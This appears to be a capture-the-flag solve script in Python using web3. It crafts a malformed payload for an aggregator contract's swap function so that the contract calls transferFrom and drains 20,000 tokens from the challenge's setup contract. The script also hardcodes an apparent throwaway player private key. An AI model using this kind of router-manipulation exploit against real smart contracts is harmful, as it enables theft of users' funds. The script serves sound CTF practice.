import sys
from web3 import Web3
from eth_abi import encode

RPC_URL = "http://challenge.cnsc.com.vn:30505/eb43a393-c7fe-4682-b622-cd636206c22c" 
PRIVATE_KEY = "4505b97a7ad6619e0bf0954639b239d4aaf7b8d916ed03a49ef4aa2a04445723"
w3 = Web3(Web3.HTTPProvider(RPC_URL))
if not w3.is_connected():
    print("[-] RPC Error.")
    sys.exit(1)

account = w3.eth.account.from_key(PRIVATE_KEY)
player = account.address
print(f"[*] Player: {player}")

setup_abi = [
    {"inputs": [], "name": "coin", "outputs": [{"internalType": "address", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "aggregator", "outputs": [{"internalType": "address", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "isSolved", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "view", "type": "function"}
]

def manual_encode_call(func_signature, types, args):
    return w3.keccak(text=func_signature)[:4] + encode(types, args)

def find_setup_contract():
    print("[*] Scan Setup Contract...")
    latest = w3.eth.block_number
    for i in range(latest + 1):
        block = w3.eth.get_block(i, full_transactions=True)
        for tx in block.transactions:
            if tx['to'] is None:
                receipt = w3.eth.get_transaction_receipt(tx['hash'])
                addr = w3.to_checksum_address(receipt.contractAddress)
                if addr == player: continue
                try:
                    c = w3.eth.contract(address=addr, abi=setup_abi)
                    coin = c.functions.coin().call()
                    if coin and coin != "0x39f391B3FdE649795EA74067D9F4c5b700030EB8":
                        return addr
                except: continue
    print("[-] Not Found. Reset Instance.")
    sys.exit(1)

def solve():
    # 1. Setup
    setup_addr = find_setup_contract()
    if setup_addr == player:
        print("[-] Bad Instance (Address Collision). Reset.")
        return

    setup = w3.eth.contract(address=setup_addr, abi=setup_abi)
    coin_addr = setup.functions.coin().call()
    agg_addr = setup.functions.aggregator().call()
    
    print(f"[*] Setup: {setup_addr}")
    print(f"[*] Coin:  {coin_addr}")
    print(f"[*] Agg:   {agg_addr}")

    if coin_addr == setup_addr:
        print("[-] Bad Instance. Reset.")
        return

    # 2. Payload
    amount = 20000 * 10**18 
    transfer_data = manual_encode_call(
        "transferFrom(address,address,uint256)", 
        ['address', 'address', 'uint256'], 
        [setup_addr, coin_addr, amount]
    )
    multicall_data = manual_encode_call(
        "multicall(bytes[])", ['bytes[]'], [[transfer_data]]
    )
    target_data = multicall_data

    # 3. Assembly Payload (Fixed Sequence Logic)
    ABS_START = 68
    
    # Layout
    # 0-76: Header
    # 76-81: Sequence (5 bytes only)
    # 81-EndHeap: Heap
    # EndHeap-End: Command (9 bytes)
    
    OFFSET_SEQ = 76
    SEQ_LEN = 5 # Fix: Only 5 bytes for Type 4 command
    OFFSET_HEAP = OFFSET_SEQ + SEQ_LEN
    LEN_HEAP = 96 + len(target_data)
    OFFSET_CMD = OFFSET_HEAP + LEN_HEAP
    TOTAL_LEN = OFFSET_CMD + 9
    
    b = bytearray(TOTAL_LEN)
    
    # Header
    header_val = OFFSET_CMD - 2
    b[0:2] = header_val.to_bytes(2, 'big')

    # Addresses
    b[4:24] = bytes.fromhex(coin_addr[2:]) 
    b[24:44] = bytes.fromhex(coin_addr[2:]) 
    b[44:64] = bytes.fromhex(coin_addr[2:]) 
    
    # Fake Pointers
    max_ptr = (ABS_START + OFFSET_HEAP + 32).to_bytes(2, 'big')
    zero_ptr = (ABS_START + OFFSET_HEAP).to_bytes(2, 'big')
    b[65:67] = max_ptr
    b[68:70] = zero_ptr
    b[71:73] = zero_ptr
    b[74:76] = zero_ptr
    
    # SEQUENCE (5 bytes)
    src_ptr = ABS_START + OFFSET_HEAP + 96
    b[OFFSET_SEQ] = 0x04 
    b[OFFSET_SEQ+1:OFFSET_SEQ+3] = src_ptr.to_bytes(2, 'big')
    b[OFFSET_SEQ+3:OFFSET_SEQ+5] = len(target_data).to_bytes(2, 'big')
    
    # HEAP
    b[OFFSET_HEAP+32:OFFSET_HEAP+64] = b'\xff' * 32
    b[OFFSET_HEAP+64:OFFSET_HEAP+84] = bytes.fromhex(coin_addr[2:]) # Left Aligned
    b[OFFSET_HEAP+96:OFFSET_HEAP+96+len(target_data)] = target_data
    
    # COMMAND
    b[OFFSET_CMD] = 0x00 
    b[OFFSET_CMD+1:OFFSET_CMD+3] = (0).to_bytes(2, 'big')
    b[OFFSET_CMD+3:OFFSET_CMD+5] = (ABS_START + OFFSET_SEQ).to_bytes(2, 'big') # Start
    b[OFFSET_CMD+5:OFFSET_CMD+7] = (ABS_START + OFFSET_SEQ + 5).to_bytes(2, 'big') # End = Start + 5 (Fixed)
    b[OFFSET_CMD+7:OFFSET_CMD+9] = (ABS_START + OFFSET_HEAP + 64).to_bytes(2, 'big')
    
    print(f"[*] Payload Len: {len(b)}")
    
    # 4. Transact
    print("[*] Sending Transaction...")
    swap_sel = w3.keccak(text="swap(bytes)")[:4]
    tx_data = swap_sel + encode(['bytes'], [b])
    
    tx = {
        'from': player, 'to': agg_addr, 'data': tx_data,
        'gas': 5000000, 'gasPrice': w3.to_wei('10', 'gwei'),
        'nonce': w3.eth.get_transaction_count(player)
    }
    
    try:
        signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
        print(f"[+] Tx: {tx_hash.hex()}")
        
        rec = w3.eth.wait_for_transaction_receipt(tx_hash)
        if rec.status == 1:
            print("[+] Success!")
            if setup.functions.isSolved().call():
                print("\n[!!!] DONE. GET FLAG (Option 3).")
            else:
                print("[???] Not solved yet.")
        else:
            print("[-] Reverted.")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    solve()